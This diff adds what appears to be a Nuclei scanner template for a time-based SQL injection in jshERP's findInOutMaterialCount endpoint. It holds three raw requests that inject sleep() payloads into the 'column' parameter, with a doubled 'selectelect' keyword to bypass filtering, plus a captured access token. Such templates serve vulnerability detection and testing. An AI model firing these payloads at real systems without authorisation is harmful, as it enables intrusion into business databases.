@@ -1,0 +1,51 @@
+id: jserp-findInOutMaterialCount-sqli
+info:
+  name: jserp-findInOutMaterialCount-sqli
+  author: apple
+  severity: high
+  description: jserp-findInOutMaterialCount-sqli
+  reference:
+    - https://github.com/jishenghua/jshERP/issues/99
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /jshERP-boot/depotHead/findInOutMaterialCount?organId=&materialParam=&depotId=&organizationId=&beginTime=2024-01-01&endTime=2024-01-12&type=%E5%87%BA%E5%BA%93&column=if(1,(s%20selectelect%20sleep(3)),(s%20selectelect%20sleep(3)))&order=asc+limit+%3f,%3f+-'-&field=id,,rowIndex,barCode,mName,standard,model,categoryName,materialUnit,numSum,priceSum&currentPage=1&pageSize=10 HTTP/2
+        Host: {{Hostname}}
+        Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1704888493; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1704958316
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0
+        Accept: application/json, text/plain, /
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        X-Access-Token: 9a45f201f4594fd7a66aee82d526e155_151076
+        Referer: https://{{Hostname}}/report/out_material_count
+
+      - |+
+        GET /jshERP-boot/depotHead/findInOutMaterialCount?organId=&materialParam=&depotId=&organizationId=&beginTime=2024-01-01&endTime=2024-01-12&type=%E5%87%BA%E5%BA%93&column=if(1,(s%20selectelect%20sleep(6)),(s%20selectelect%20sleep(6)))&order=asc+limit+%3f,%3f+-'-&field=id,,rowIndex,barCode,mName,standard,model,categoryName,materialUnit,numSum,priceSum&currentPage=1&pageSize=10 HTTP/2
+        Host: {{Hostname}}
+        Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1704888493; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1704958316
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0
+        Accept: application/json, text/plain, /
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        X-Access-Token: 9a45f201f4594fd7a66aee82d526e155_151076
+        Referer: https://{{Hostname}}/report/out_material_count
+
+      - |+
+        GET /jshERP-boot/depotHead/findInOutMaterialCount?organId=&materialParam=&depotId=&organizationId=&beginTime=2024-01-01&endTime=2024-01-12&type=%E5%87%BA%E5%BA%93&column=if(1,(s%20selectelect%20sleep(9)),(s%20selectelect%20sleep(9)))&order=asc+limit+%3f,%3f+-'-&field=id,,rowIndex,barCode,mName,standard,model,categoryName,materialUnit,numSum,priceSum&currentPage=1&pageSize=10 HTTP/2
+        Host: {{Hostname}}
+        Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1704888493; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1704958316
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0
+        Accept: application/json, text/plain, /
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        X-Access-Token: 9a45f201f4594fd7a66aee82d526e155_151076
+        Referer: https://{{Hostname}}/report/out_material_count
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
